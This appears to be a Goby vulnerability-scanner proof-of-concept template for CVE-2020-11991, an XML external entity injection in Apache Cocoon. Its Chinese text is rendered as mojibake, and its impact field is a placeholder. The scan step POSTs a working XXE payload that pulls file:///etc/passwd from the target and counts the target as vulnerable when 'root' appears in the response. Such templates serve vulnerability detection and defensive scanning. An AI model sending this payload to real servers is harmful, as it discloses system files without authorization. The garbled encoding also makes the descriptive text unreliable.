{
      "Name": "Apache Cocoon Xml æ³¨å…¥ CVE-2020-11991",
      "Level": "1",
      "Tags": [
            "XMLæ³¨å…¥"
      ],
      "GobyQuery": "app=\"Apache-Cocoon\"",
      "Description": "9æœˆ11æ—¥ Apache è½¯ä»¶åŸºé‡‘ä¼šå‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œä¿®å¤äº† Apache Cocoon xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2020-11991ï¼‰ã€‚\n\nApache Cocoon æ˜¯ä¸€ä¸ªåŸºäº Spring æ¡†æ¶çš„å›´ç»•åˆ†ç¦»ç†å¿µå»ºç«‹çš„æ„æ¶ï¼Œåœ¨è¿™ç§æ¡†æ¶ä¸‹çš„æ‰€æœ‰å¤„ç†éƒ½è¢«é¢„å…ˆå®šä¹‰å¥½çš„å¤„ç†ç»„ä»¶çº¿æ€§è¿æ¥èµ·æ¥ï¼Œèƒ½å¤Ÿå°†è¾“å…¥å’Œäº§ç”Ÿçš„è¾“å‡ºæŒ‰ç…§æµæ°´çº¿é¡ºåºå¤„ç†ã€‚ç”¨æˆ·ç¾¤ï¼šApache Lenyaã€Daisy CMSã€Hippo CMSã€Mindquarryç­‰ç­‰ï¼ŒApache Cocoon é€šå¸¸è¢«ä½œä¸ºä¸€ä¸ªæ•°æ®æŠ½å–ã€è½¬æ¢ã€åŠ è½½å·¥å…·æˆ–è€…æ˜¯ç³»ç»Ÿä¹‹é—´ä¼ è¾“æ•°æ®çš„ä¸­è½¬ç«™ã€‚CVE-2020-11991 ä¸ StreamGenerator æœ‰å…³ï¼Œåœ¨ä½¿ç”¨ StreamGenerator æ—¶ï¼Œä»£ç å°†è§£æç”¨æˆ·æä¾›çš„ xmlã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨åŒ…æ‹¬å¤–éƒ¨ç³»ç»Ÿå®ä½“åœ¨å†…çš„ç‰¹åˆ¶ xml æ¥è®¿é—®æœåŠ¡å™¨ç³»ç»Ÿä¸Šçš„ä»»ä½•æ–‡ä»¶ã€‚\n\nApache Cocoon <= 2.1.12",
      "Product": "Apache Cocoon",
      "Homepage": "http://cocoon.apache.org/2.1/",
      "Author": "PeiQi",
      "Impact": "<p><span style=\"color: rgb(65, 140, 175);\">å’©å’©å’©</span>ğŸ‘</p>",
      "Recommandation": "",
      "References": [
            "http://wiki.peiqi.tech"
      ],
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/v2/api/product/manger/getInfo",
                        "follow_redirect": true,
                        "header": {
                              "Content-type": "text/xml"
                        },
                        "data_type": "text",
                        "data": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<userInfo>\n<firstName>John</firstName> \n<lastName>&ent;</lastName>\n</userInfo>"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "root",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "PostTime": "2021-01-22 22:24:01",
      "GobyVersion": "1.8.237"
}